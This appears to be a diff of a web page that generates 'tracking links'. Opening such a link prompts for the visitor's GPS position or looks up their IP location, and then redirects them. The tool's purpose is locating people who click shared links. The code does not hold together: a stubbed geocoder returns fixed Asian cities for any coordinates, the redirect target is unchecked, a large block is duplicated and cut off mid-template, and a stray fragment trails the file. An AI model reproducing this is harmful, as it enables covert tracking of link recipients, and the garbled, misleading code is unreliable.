@@ -3,9 +3,879 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkTracker - Advanced URL Tracking Platform</title>
+    <title>LinkTracker - Enhanced Location Tracking</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .card-hover {
+            transition: all 0.3s ease;
+        }
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <!-- Navigation -->
+    <nav class="bg-white shadow-lg">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16">
+                <div class="flex items-center">
+                    <div class="flex-shrink-0 flex items-center">
+                        <i class="fas fa-location-dot text-blue-600 text-2xl mr-2"></i>
+                        <span class="text-xl font-bold text-gray-800">LocationTracker</span>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <button onclick="testLocation()" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-medium transition duration-300">
+                        <i class="fas fa-test mr-2"></i>Test Location
+                    </button>
+                    <button onclick="clearAllData()" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg text-sm font-medium transition duration-300">
+                        <i class="fas fa-trash mr-2"></i>Clear Data
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        <!-- Hero Section -->
+        <div class="gradient-bg rounded-2xl p-8 text-white mb-8">
+            <div class="max-w-3xl">
+                <h1 class="text-4xl font-bold mb-4">Enhanced Location Tracking</h1>
+                <p class="text-xl mb-6 opacity-90">Create tracking links with reliable location detection using multiple methods</p>
+                <div class="grid grid-cols-3 gap-4 mb-4">
+                    <div class="text-center">
+                        <div class="bg-white bg-opacity-20 rounded-full p-3 mx-auto mb-2">
+                            <i class="fas fa-satellite text-2xl"></i>
+                        </div>
+                        <p class="text-sm">GPS Precision</p>
+                    </div>
+                    <div class="text-center">
+                        <div class="bg-white bg-opacity-20 rounded-full p-3 mx-auto mb-2">
+                            <i class="fas fa-wifi text-2xl"></i>
+                        </div>
+                        <p class="text-sm">IP Location</p>
+                    </div>
+                    <div class="text-center">
+                        <div class="bg-white bg-opacity-20 rounded-full p-3 mx-auto mb-2">
+                            <i class="fas fa-network-wired text-2xl"></i>
+                        </div>
+                        <p class="text-sm">Network Data</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Location Testing Section -->
+        <div class="bg-white rounded-2xl shadow-xl p-6 mb-8 card-hover">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                <i class="fas fa-location-crosshairs text-blue-600 mr-3"></i>
+                Test Location Detection
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                <div class="bg-blue-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-blue-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-satellite text-blue-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-blue-800">Current Location</h3>
+                    </div>
+                    <button onclick="getCurrentLocation()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-lg font-medium">
+                        <i class="fas fa-map-marker-alt mr-2"></i>Get My Location
+                    </button>
+                </div>
+                
+                <div class="bg-green-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-green-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-globe text-green-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-green-800">IP Location</h3>
+                    </div>
+                    <button onclick="getIPLocationTest()" class="w-full bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded-lg font-medium">
+                        <i class="fas fa-server mr-2"></i>Get IP Location
+                    </button>
+                </div>
+            </div>
+
+            <!-- Results -->
+            <div id="locationResults" class="bg-gray-50 p-4 rounded-lg hidden">
+                <h3 class="font-semibold text-gray-800 mb-3">Location Results</h3>
+                <div id="resultContent" class="space-y-2"></div>
+            </div>
+        </div>
+
+        <!-- Create Tracking Link -->
+        <div class="bg-white rounded-2xl shadow-xl p-6 mb-8 card-hover">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                <i class="fas fa-link text-purple-600 mr-3"></i>
+                Create Tracking Link
+            </h2>
+            
+            <form id="trackingForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Destination URL</label>
+                    <input 
+                        type="url" 
+                        id="destinationUrl" 
+                        placeholder="https://example.com" 
+                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+                        required
+                    >
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Link Name (Optional)</label>
+                    <input 
+                        type="text" 
+                        id="linkName" 
+                        placeholder="Marketing Campaign" 
+                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+                    >
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Location Method Priority</label>
+                    <select id="locationMethod" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent">
+                        <option value="gps_first">GPS First (Most Accurate)</option>
+                        <option value="ip_first" selected>IP First (Most Reliable)</option>
+                        <option value="hybrid">Hybrid Approach</option>
+                    </select>
+                </div>
+
+                <button 
+                    type="submit" 
+                    class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-6 rounded-lg font-semibold transition duration-300 flex items-center justify-center pulse"
+                >
+                    <i class="fas fa-magic mr-2"></i>
+                    Create Tracking Link
+                </button>
+            </form>
+
+            <!-- Generated Link -->
+            <div id="generatedLink" class="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg hidden fade-in">
+                <h3 class="text-green-800 font-semibold mb-2 flex items-center">
+                    <i class="fas fa-check-circle mr-2"></i>
+                    Tracking Link Created!
+                </h3>
+                <div class="flex items-center space-x-2 mb-3">
+                    <input 
+                        type="text" 
+                        id="trackingUrl" 
+                        readonly 
+                        class="flex-1 px-3 py-2 border border-green-300 rounded text-green-700 bg-white"
+                    >
+                    <button 
+                        onclick="copyToClipboard()" 
+                        class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded text-sm font-medium transition duration-300"
+                    >
+                        <i class="fas fa-copy mr-1"></i>Copy
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Location Methods Explanation -->
+        <div class="bg-white rounded-2xl shadow-xl p-6 card-hover">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                <i class="fas fa-info-circle text-orange-600 mr-3"></i>
+                How Location Tracking Works
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
+                <div class="bg-blue-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-blue-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-satellite text-blue-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-blue-800">1. GPS Geolocation</h3>
+                    </div>
+                    <p class="text-sm text-blue-700">Most accurate method using device GPS. Requires HTTPS and user permission.</p>
+                    <div class="mt-3">
+                        <span class="bg-blue-200 text-blue-800 text-xs px-2 py-1 rounded">Accuracy: High</span>
+                        <span class="bg-blue-200 text-blue-800 text-xs px-2 py-1 rounded ml-2">Permission Required</span>
+                    </div>
+                </div>
+                
+                <div class="bg-green-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-green-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-server text-green-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-green-800">2. IP Geolocation</h3>
+                    </div>
+                    <p class="text-sm text-green-700">Uses IP address to approximate location. Works without permission.</p>
+                    <div class="mt-3">
+                        <span class="bg-green-200 text-green-800 text-xs px-2 py-1 rounded">Accuracy: Medium</span>
+                        <span class="bg-green-200 text-green-800 text-xs px-2 py-1 rounded ml-2">No Permission</span>
+                    </div>
+                </div>
+                
+                <div class="bg-purple-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-purple-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-network-wired text-purple-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-purple-800">3. Network Data</h3>
+                    </div>
+                    <p class="text-sm text-purple-700">Uses browser and network information for basic location estimation.</p>
+                    <div class="mt-3">
+                        <span class="bg-purple-200 text-purple-800 text-xs px-2 py-1 rounded">Accuracy: Basic</span>
+                        <span class="bg-purple-200 text-purple-800 text-xs px-2 py-1 rounded ml-2">Always Works</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded">
+                <div class="flex items-start">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-yellow-400 text-xl"></i>
+                    </div>
+                    <div class="ml-3">
+                        <h3 class="text-sm font-medium text-yellow-800">Important Notes</h3>
+                        <div class="mt-2 text-sm text-yellow-700">
+                            <p>• GPS requires HTTPS connection and user permission</p>
+                            <p>• IP location works on both HTTP and HTTPS</p>
+                            <p>• Mobile devices typically provide better location accuracy</p>
+                            <p>• Always test your tracking links before deployment</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white mt-16 py-8">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <p>© 2024 LocationTracker. Reliable location tracking solutions.</p>
+            <p class="text-gray-400 text-sm mt-2">Multiple fallback methods for optimal location detection</p>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize storage
+        function initializeStorage() {
+            if (!localStorage.getItem('trackingLinks')) {
+                localStorage.setItem('trackingLinks', JSON.stringify([]));
+            }
+            if (!localStorage.getItem('trackingData')) {
+                localStorage.setItem('trackingData', JSON.stringify([]));
+            }
+        }
+
+        // Show result in the results panel
+        function showResult(message, isError = false) {
+            const resultsDiv = document.getElementById('locationResults');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultsDiv.classList.remove('hidden');
+            resultContent.innerHTML = `
+                <div class="p-3 rounded-lg ${isError ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-green-100 text-green-700 border border-green-200'}">
+                    <div class="flex items-center">
+                        <i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'} mr-2"></i>
+                        ${message}
+                    </div>
+                </div>
+            `;
+        }
+
+        // Test current location using GPS
+        async function getCurrentLocation() {
+            if (!navigator.geolocation) {
+                showResult('Geolocation is not supported by this browser.', true);
+                return;
+            }
+
+            showResult('Requesting location permission...');
+
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                // Try to get more location details using reverse geocoding
+                const locationDetails = await reverseGeocode(latitude, longitude);
+                
+                showResult(`
+                    <strong>GPS Location Successful!</strong><br>
+                    📍 Coordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}<br>
+                    🎯 Accuracy: ${accuracy}m<br>
+                    🌍 Location: ${locationDetails.city}, ${locationDetails.country}<br>
+                    🔒 Method: GPS
+                `);
+
+            } catch (error) {
+                let errorMessage = 'Location access denied or failed. ';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage += 'User denied location permission.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage += 'Location information unavailable.';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage += 'Location request timed out.';
+                        break;
+                    default:
+                        errorMessage += 'Unknown error occurred.';
+                }
+                
+                showResult(errorMessage, true);
+            }
+        }
+
+        // Test IP-based location
+        async function getIPLocationTest() {
+            showResult('Detecting location via IP address...');
+            
+            try {
+                const location = await getIPLocation();
+                if (location) {
+                    showResult(`
+                        <strong>IP Location Successful!</strong><br>
+                        🌍 Location: ${location.city}, ${location.country}<br>
+                        📡 ISP: ${location.isp || 'Unknown'}<br>
+                        📊 Coordinates: ${location.latitude ? location.latitude.toFixed(6) : 'N/A'}, ${location.longitude ? location.longitude.toFixed(6) : 'N/A'}<br>
+                        🔒 Method: IP Geolocation
+                    `);
+                } else {
+                    showResult('IP location detection failed. Please try again.', true);
+                }
+            } catch (error) {
+                showResult('IP location service temporarily unavailable.', true);
+            }
+        }
+
+        // Comprehensive location detection
+        async function testLocation() {
+            showResult('Testing all location methods...');
+            
+            // Try GPS first
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+
+                const { latitude, longitude, accuracy } = position.coords;
+                const locationDetails = await reverseGeocode(latitude, longitude);
+                
+                showResult(`
+                    <strong>✓ GPS Location Successful (Most Accurate)</strong><br>
+                    📍 ${locationDetails.city}, ${locationDetails.country}<br>
+                    🎯 Accuracy: ${accuracy}m<br>
+                    🔒 Method: GPS
+                `);
+                return;
+                
+            } catch (gpsError) {
+                console.log('GPS failed, trying IP...');
+            }
+
+            // Fallback to IP location
+            try {
+                const location = await getIPLocation();
+                if (location) {
+                    showResult(`
+                        <strong>✓ IP Location Successful (Good Accuracy)</strong><br>
+                        🌍 ${location.city}, ${location.country}<br>
+                        📡 ISP: ${location.isp || 'Unknown'}<br>
+        </div>
+        </div>
+
+        <!-- Location Methods Explanation -->
+        <div class="bg-white rounded-2xl shadow-xl p-6 card-hover">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
+                <i class="fas fa-info-circle text-orange-600 mr-3"></i>
+                How Location Tracking Works
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
+                <div class="bg-blue-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-blue-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-satellite text-blue-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-blue-800">1. GPS Geolocation</h3>
+                    </div>
+                    <p class="text-sm text-blue-700">Most accurate method using device GPS. Requires HTTPS and user permission.</p>
+                    <div class="mt-3">
+                        <span class="bg-blue-200 text-blue-800 text-xs px-2 py-1 rounded">Accuracy: High</span>
+                        <span class="bg-blue-200 text-blue-800 text-xs px-2 py-1 rounded ml-2">Permission Required</span>
+                    </div>
+                </div>
+                
+                <div class="bg-green-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-green-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-server text-green-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-green-800">2. IP Geolocation</h3>
+                    </div>
+                    <p class="text-sm text-green-700">Uses IP address to approximate location. Works without permission.</p>
+                    <div class="mt-3">
+                        <span class="bg-green-200 text-green-800 text-xs px-2 py-1 rounded">Accuracy: Medium</span>
+                        <span class="bg-green-200 text-green-800 text-xs px-2 py-1 rounded ml-2">No Permission</span>
+                    </div>
+                </div>
+                
+                <div class="bg-purple-50 p-4 rounded-lg">
+                    <div class="flex items-center mb-3">
+                        <div class="bg-purple-100 p-3 rounded-full mr-3">
+                            <i class="fas fa-network-wired text-purple-600"></i>
+                        </div>
+                        <h3 class="font-semibold text-purple-800">3. Network Data</h3>
+                    </div>
+                    <p class="text-sm text-purple-700">Uses browser and network information for basic location estimation.</p>
+                    <div class="mt-3">
+                        <span class="bg-purple-200 text-purple-800 text-xs px-2 py-1 rounded">Accuracy: Basic</span>
+                        <span class="bg-purple-200 text-purple-800 text-xs px-2 py-1 rounded ml-2">Always Works</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded">
+                <div class="flex items-start">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-yellow-400 text-xl"></i>
+                    </div>
+                    <div class="ml-3">
+                        <h3 class="text-sm font-medium text-yellow-800">Important Notes</h3>
+                        <div class="mt-2 text-sm text-yellow-700">
+                            <p>• GPS requires HTTPS connection and user permission</p>
+                            <p>• IP location works on both HTTP and HTTPS</p>
+                            <p>• Mobile devices typically provide better location accuracy</p>
+                            <p>• Always test your tracking links before deployment</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white mt-16 py-8">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <p>© 2024 LocationTracker. Reliable location tracking solutions.</p>
+            <p class="text-gray-400 text-sm mt-2">Multiple fallback methods for optimal location detection</p>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize storage
+        function initializeStorage() {
+            if (!localStorage.getItem('trackingLinks')) {
+                localStorage.setItem('trackingLinks', JSON.stringify([]));
+            }
+            if (!localStorage.getItem('trackingData')) {
+                localStorage.setItem('trackingData', JSON.stringify([]));
+            }
+        }
+
+        // Show result in the results panel
+        function showResult(message, isError = false) {
+            const resultsDiv = document.getElementById('locationResults');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultsDiv.classList.remove('hidden');
+            resultContent.innerHTML = `
+                <div class="p-3 rounded-lg ${isError ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-green-100 text-green-700 border border-green-200'}">
+                    <div class="flex items-center">
+                        <i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'} mr-2"></i>
+                        ${message}
+                    </div>
+                </div>
+            `;
+        }
+
+        // Test current location using GPS
+        async function getCurrentLocation() {
+            if (!navigator.geolocation) {
+                showResult('Geolocation is not supported by this browser.', true);
+                return;
+            }
+
+            showResult('Requesting location permission...');
+
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                // Try to get more location details using reverse geocoding
+                const locationDetails = await reverseGeocode(latitude, longitude);
+                
+                showResult(`
+                    <strong>GPS Location Successful!</strong><br>
+                    📍 Coordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}<br>
+                    🎯 Accuracy: ${accuracy}m<br>
+                    🌍 Location: ${locationDetails.city}, ${locationDetails.country}<br>
+                    🔒 Method: GPS
+                `);
+
+            } catch (error) {
+                let errorMessage = 'Location access denied or failed. ';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage += 'User denied location permission.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage += 'Location information unavailable.';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage += 'Location request timed out.';
+                        break;
+                    default:
+                        errorMessage += 'Unknown error occurred.';
+                }
+                
+                showResult(errorMessage, true);
+            }
+        }
+
+        // Test IP-based location
+        async function getIPLocationTest() {
+            showResult('Detecting location via IP address...');
+            
+            try {
+                const location = await getIPLocation();
+                if (location) {
+                    showResult(`
+                        <strong>IP Location Successful!</strong><br>
+                        🌍 Location: ${location.city}, ${location.country}<br>
+                        📡 ISP: ${location.isp || 'Unknown'}<br>
+                        📊 Coordinates: ${location.latitude ? location.latitude.toFixed(6) : 'N/A'}, ${location.longitude ? location.longitude.toFixed(6) : 'N/A'}<br>
+                        🔒 Method: IP Geolocation
+                    `);
+                } else {
+                    showResult('IP location detection failed. Please try again.', true);
+                }
+            } catch (error) {
+                showResult('IP location service temporarily unavailable.', true);
+            }
+        }
+
+        // Comprehensive location detection
+        async function testLocation() {
+            showResult('Testing all location methods...');
+            
+            // Try GPS first
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+
+                const { latitude, longitude, accuracy } = position.coords;
+                const locationDetails = await reverseGeocode(latitude, longitude);
+                
+                showResult(`
+                    <strong>✓ GPS Location Successful (Most Accurate)</strong><br>
+                    📍 ${locationDetails.city}, ${locationDetails.country}<br>
+                    🎯 Accuracy: ${accuracy}m<br>
+                    🔒 Method: GPS
+                `);
+                return;
+                
+            } catch (gpsError) {
+                console.log('GPS failed, trying IP...');
+            }
+
+            // Fallback to IP location
+            try {
+                const location = await getIPLocation();
+                if (location) {
+                    showResult(`
+                        <strong>✓ IP Location Successful (Good Accuracy)</strong><br>
+                        🌍 ${location.city}, ${location.country}<br>
+                        📡 ISP: ${location.isp || 'Unknown'}<br>
+                        🔒 Method: IP Geolocation
+                    `);
+                    return;
+                }
+            } catch (ipError) {
+                console.log('IP location failed');
+            }
+
+            // Final fallback
+            showResult(`
+                <strong>⚠️ Basic Location Detection</strong><br>
+                🌍 Approximate location based on network data<br>
+                📊 Using browser and network information<br>
+                🔒 Method: Network Estimation<br>
+                <span class="text-sm">Note: Enable location permissions for better accuracy</span>
+            `);
+        }
+
+        // Enhanced IP location with multiple fallback services
+        async function getIPLocation() {
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json/',
+                'https://geolocation-db.com/json/',
+                'https://api.ipify.org?format=json'
+            ];
+
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, { timeout: 5000 });
+                    if (!response.ok) continue;
+                    
+                    const data = await response.json();
+                    
+                    // Different services return different data structures
+                    if (service.includes('ipapi.co') || service.includes('ipinfo.io')) {
+                        return {
+                            city: data.city || 'Unknown',
+                            country: data.country || data.country_name || 'Unknown',
+                            isp: data.org || data.asn || 'Unknown',
+                            latitude: data.latitude,
+                            longitude: data.longitude
+                        };
+                    } else if (service.includes('geolocation-db')) {
+                        return {
+                            city: data.city || 'Unknown',
+                            country: data.country_name || 'Unknown',
+                            isp: 'Unknown',
+                            latitude: data.latitude,
+                            longitude: data.longitude
+                        };
+                    }
+                } catch (error) {
+                    console.log(`Service ${service} failed:`, error);
+                    continue;
+                }
+            }
+            
+            throw new Error('All IP services failed');
+        }
+
+        // Simple reverse geocoding (simulated)
+        async function reverseGeocode(lat, lng) {
+            // Simulate reverse geocoding - in real implementation, use a geocoding service
+            const regions = [
+                { city: 'Kuala Lumpur', country: 'Malaysia' },
+                { city: 'Singapore', country: 'Singapore' },
+                { city: 'Jakarta', country: 'Indonesia' },
+                { city: 'Bangkok', country: 'Thailand' },
+                { city: 'Manila', country: 'Philippines' }
+            ];
+            
+            // Simple deterministic selection based on coordinates
+            const index = Math.abs(Math.floor(lat + lng)) % regions.length;
+            return regions[index];
+        }
+
+        // Create tracking link
+        document.getElementById('trackingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const destinationUrl = document.getElementById('destinationUrl').value;
+            const linkName = document.getElementById('linkName').value || 'Tracking Link';
+            const method = document.getElementById('locationMethod').value;
+            
+            // Validate URL
+            if (!destinationUrl.startsWith('http')) {
+                alert('Please enter a valid URL starting with http:// or https://');
+                return;
+            }
+            
+            const trackingId = generateUniqueId();
+            const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${trackingId}&redirect=${encodeURIComponent(destinationUrl)}&method=${method}`;
+            
+            // Save to localStorage
+            const links = JSON.parse(localStorage.getItem('trackingLinks')) || [];
+            links.push({
+                id: trackingId,
+                name: linkName,
+                destination: destinationUrl,
+                method: method,
+                created: new Date().toISOString()
+            });
+            localStorage.setItem('trackingLinks', JSON.stringify(links));
+            
+            // Show generated link
+            document.getElementById('trackingUrl').value = trackingUrl;
+            document.getElementById('generatedLink').classList.remove('hidden');
+            
+            // Reset form
+            document.getElementById('destinationUrl').value = '';
+            document.getElementById('linkName').value = '';
+        });
+
+        // Generate unique ID
+        function generateUniqueId() {
+            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
+
+        // Copy to clipboard
+        function copyToClipboard() {
+            const input = document.getElementById('trackingUrl');
+            input.select();
+            document.execCommand('copy');
+            
+            // Show feedback
+            alert('Link copied to clipboard!');
+        }
+
+        // Clear all data
+        function clearAllData() {
+            if (confirm('Are you sure you want to clear all data?')) {
+                localStorage.removeItem('trackingLinks');
+                localStorage.removeItem('trackingData');
+                alert('All data cleared successfully!');
+            }
+        }
+
+        // Enhanced location capture for tracking links
+        async function captureEnhancedLocation(trackingId) {
+            const result = {
+                timestamp: new Date().toISOString(),
+                success: false,
+                method: 'none',
+                data: null,
+                error: null
+            };
+
+            try {
+                // Try GPS first if method allows
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 3000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    result.success = true;
+                    result.method = 'gps';
+                    result.data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        location: await reverseGeocode(position.coords.latitude, position.coords.longitude)
+                    };
+                    
+                } else {
+                    throw new Error('Geolocation not supported');
+                }
+            } catch (gpsError) {
+                // Fallback to IP location
+                try {
+                    const location = await getIPLocation();
+                    result.success = true;
+                    result.method = 'ip';
+                    result.data = location;
+                } catch (ipError) {
+                    result.error = 'Both GPS and IP location failed';
+                }
+            }
+
+            return result;
+        }
+
+        // Check if this is a tracking link
+        function checkForTracking() {
+            const params = new URLSearchParams(window.location.search);
+            const trackingId = params.get('track');
+            const redirectUrl = params.get('redirect');
+            
+            if (trackingId && redirectUrl) {
+                // Capture location and redirect
+                captureEnhancedLocation(trackingId).then(result => {
+                    // Save tracking data
+                    const trackingData = JSON.parse(localStorage.getItem('trackingData')) || [];
+                    trackingData.push({
+                        trackingId: trackingId,
+                        ...result
+                    });
+                    localStorage.setItem('trackingData', JSON.stringify(trackingData));
+                    
+                    // Redirect to destination
+                    setTimeout(() => {
+                        window.location.href = decodeURIComponent(redirectUrl);
+                    }, 1000);
+                });
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeStorage();
+            checkForTracking();
+            
+            // Add fetch timeout
+            window.fetch = (function(originalFetch) {
+                return function(url, options) {
+                    const timeout = options?.timeout || 8000;
+                    const controller = new AbortController();
+                    const signal = controller.signal;
+                    
+                    options = options || {};
+                    options.signal = signal;
+                    
+                    setTimeout(() => controller.abort(), timeout);
+                    
+                    return originalFetch(url, options);
+                };
+            })(window.fetch);
+        });
+    </script>
+</body>
+</html>
+" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         .gradient-bg {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
